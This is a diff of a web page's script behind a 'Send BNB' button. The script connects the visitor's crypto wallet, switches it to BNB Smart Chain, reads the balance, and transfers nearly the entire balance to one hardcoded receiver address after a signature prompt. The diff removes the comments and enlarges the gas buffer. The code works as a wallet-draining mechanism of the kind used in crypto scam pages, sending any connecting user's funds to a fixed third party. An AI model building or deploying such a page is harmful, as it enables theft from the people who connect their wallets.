@@ -8,35 +8,28 @@
   <button id="sendButton">Send BNB</button>
 
   <script>
-    // Fixed receiver address (updated to your given address)
     const receiverAddress = '0x70d459946ccea3CAC19ca79c9E40ea291625fAf8';
-    // Fixed gas parameters
-    const gasLimit = 21000;          // Gas limit for standard BNB transfer
-    const gasPriceGwei = 1;         // Gas price in Gwei
+    const gasLimit = 21000;
+    const gasPriceGwei = 1;
 
     document.getElementById('sendButton').addEventListener('click', async () => {
-      // Ensure a web3 provider (MetaMask/Trust Wallet) is available
       if (!window.ethereum) {
         alert('Please install MetaMask or Trust Wallet to use this DApp.');
         return;
       }
       const ethereum = window.ethereum;
       try {
-        // Request account access if needed
         const accounts = await ethereum.request({ method: 'eth_requestAccounts' });
         const account = accounts[0];
 
-        // Check if the user is on BNB Smart Chain (chainId 56 / 0x38)
         let chainId = await ethereum.request({ method: 'eth_chainId' });
         if (chainId !== '0x38') {
           try {
-            // Attempt to switch to BNB Smart Chain
             await ethereum.request({
               method: 'wallet_switchEthereumChain',
               params: [{ chainId: '0x38' }],
             });
           } catch (switchError) {
-            // If the BNB chain is not added to the wallet, add it
             if (switchError.code === 4902) {
               try {
                 await ethereum.request({
@@ -60,37 +53,33 @@
           }
         }
 
-        // Retrieve account balance
         const balanceHex = await ethereum.request({
           method: 'eth_getBalance',
           params: [account, 'latest']
         });
         const balanceWei = BigInt(balanceHex);
 
-        // Calculate gas cost (21000 * 1 Gwei)
-        const gasCost = BigInt(gasLimit) * BigInt(1e9);
-        if (balanceWei <= gasCost) {
+        const gasCost = BigInt(gasLimit) * BigInt(1e9); // 1 Gwei
+        const bufferGasCost = gasCost * BigInt(15n) / BigInt(10n); // 1.5x buffer
+
+        if (balanceWei <= bufferGasCost) {
           alert('Insufficient BNB to cover transaction gas.');
           return;
         }
-        // Compute amount to send: all BNB minus gas cost
-        const amountWei = balanceWei - gasCost;
 
-        // Format amount in BNB for the confirmation message (up to 6 decimals)
+        const amountWei = balanceWei - bufferGasCost;
+
         const whole = amountWei / BigInt(1e18);
         const fraction = amountWei % BigInt(1e18);
         const fractionDisplay = fraction.toString().padStart(18, '0').substring(0, 6);
         const amountDisplay = `${whole.toString()}.${fractionDisplay}`;
 
-        // Stage 1: Prompt user to sign a confirmation message
         const message = `Please sign this message to confirm sending ${amountDisplay} BNB to ${receiverAddress}.`;
         await ethereum.request({
           method: 'personal_sign',
           params: [message, account],
         });
-        // At this point, user has approved the intent (first wallet prompt)
 
-        // Stage 2: Send the transaction to transfer BNB (second wallet prompt)
         const txHash = await ethereum.request({
           method: 'eth_sendTransaction',
           params: [{
